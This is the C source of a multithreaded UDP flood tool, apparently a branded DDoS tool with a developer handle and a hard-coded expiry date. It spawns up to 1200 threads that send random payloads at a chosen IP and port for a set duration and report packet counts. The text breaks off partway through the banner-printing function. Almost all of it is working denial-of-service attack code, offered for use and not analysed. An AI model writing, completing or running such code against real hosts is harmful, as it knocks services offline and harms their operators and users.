#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <math.h>

#define EXPIRATION_YEAR 2035
#define EXPIRATION_MONTH 3
#define EXPIRATION_DAY 10
#define DEFAULT_PACKET_SIZE 999
#define DEFAULT_THREAD_COUNT 1200

typedef struct {
    char *target_ip;
    int target_port;
    int duration;
    int packet_size;
    int thread_id;
} attack_params;

volatile int keep_running = 1;
volatile unsigned long total_packets_sent = 0;
char *global_payload = NULL;

void handle_signal(int signal) {
    keep_running = 0;
}

void generate_random_payload(char *payload, int size) {
    for (int i = 0; i < size; i++) {
        payload[i] = (rand() % 256);
    }
}

void *udp_flood(void *arg) {
    attack_params *params = (attack_params *)arg;
    int sock;
    struct sockaddr_in server_addr;

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->target_port);
    server_addr.sin_addr.s_addr = inet_addr(params->target_ip);

    time_t end_time = time(NULL) + params->duration;
    unsigned long packets_sent_by_thread = 0;

    while (time(NULL) < end_time && keep_running) {
        sendto(sock, global_payload, params->packet_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        __sync_fetch_and_add(&total_packets_sent, 1);
        packets_sent_by_thread++;
    }

    close(sock);
    printf("\033[1;32mThread %d\033[0m sent \033[1;33m%lu packets\033[0m.\n", params->thread_id, packets_sent_by_thread);
    return NULL;
}

void display_progress(time_t start_time, int duration) {
    time_t now = time(NULL);
    int elapsed = (int)difftime(now, start_time);
    int remaining = duration - elapsed;
    if (remaining < 0) remaining = 0;

    printf("\033[2K\r");
    printf("\033[1;36mTime Remaining:\033[0m \033[1;35m%02d:%02d\033[0m\n", remaining / 60, remaining % 60);
    printf("\033[1;34mTotal Packets Sent:\033[0m \033[1;35m%lu\033[0m\n", total_packets_sent);
    fflush(stdout);
}

void print_stylish_text() {
    time_t now;
    time(&now);
    struct tm expiry_date = {0};
    expiry_date.tm_year = EXPIRATION_YEAR - 1900;
    expiry_date.tm_mon = EXPIRATION_MONTH - 1;
    expiry_date.tm_mday = EXPIRATION_DAY;
    time_t expiry_time = mktime(&expiry_date);
    double remaining_seconds = difftime(expiry_time, now);
    int remaining_days = (int)(remaining_seconds / (60 * 60 * 24));
    int remaining_hours = (int)fmod((remaining_seconds / (60 * 60)), 24);
    int remaining_minutes = (int)fmod((remaining_seconds / 60), 60);
    int remaining_seconds_int = (int)fmod(remaining_seconds, 60);

    printf("\n");
    printf("\033[1;35m╔════════════════════════════════════════╗\033[0m\n");
    printf("\033[1;35m║ \033[1;36m★ \033[1;32mR A J A B H A I \033[1;36m★ \033[1;35m║\033[0m\n");
    printf("\033[1;35m╠════════════════════════════════════════╣\033[0m\n");
    printf("\033[1;35m║ \033[1;33m✦ DEVELOPED BY: \033[1;32m@RAJARAJ_04 \033[1;35m║\033[0m\n");
    printf("\033[1;35m║ \033[1;33m✦ EXPIRY TIME: \033[1;32m%d days